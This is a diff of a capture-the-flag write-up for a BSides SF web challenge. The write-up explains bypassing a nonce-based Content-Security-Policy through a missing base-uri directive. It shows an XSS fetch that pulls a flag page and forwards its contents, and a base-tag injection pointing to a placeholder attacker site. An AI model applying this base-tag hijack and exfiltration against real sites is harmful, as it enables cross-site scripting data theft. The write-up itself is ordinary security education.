@@ -10,8 +10,6 @@ description: |
 tags: ["web"]
 ---
 
-# web-tutorial-2 — bsides-ctf (web)
-
 The CSP to deal with
 
 ```http
@@ -20,6 +18,7 @@ default-src 'self';
 script-src 'self' 'nonce-AxTYup01jhBMgmiNwTwUgfS1PZeZ58rE';
 connect-src *;
 style-src-elem 'self' fonts.googleapis.com fonts.gstatic.com; font-src 'self' fonts.gstatic.com fonts.googleapis.com
+
 ```
 
 [https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#nonce-based-strict-policy](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html#nonce-based-strict-policy)
@@ -31,7 +30,8 @@ Content-Security-Policy:
   script-src 'nonce-{RANDOM}' 'strict-dynamic';
   object-src 'none';
   base-uri 'none';
-```
+
+```html
 
 In here you can see Nonce being mentioned but from the CSP in the site it is clear that base-uri is missing so we can try exploiting that
 
@@ -48,13 +48,15 @@ fetch("https://web-tutorial-2-9fec29fc.challenges.bsidessf.net/xss-two-flag")
         encodeURIComponent(data),
     );
   });
+
 ```
 
 So to use the base uri opening we just do
 
 ```html
 <base href="https://<my site>/test.js" />
+
 ```
 
 get the flag
-![image.png](image.png)
+![Web tutorial - Screenshot](image.png)
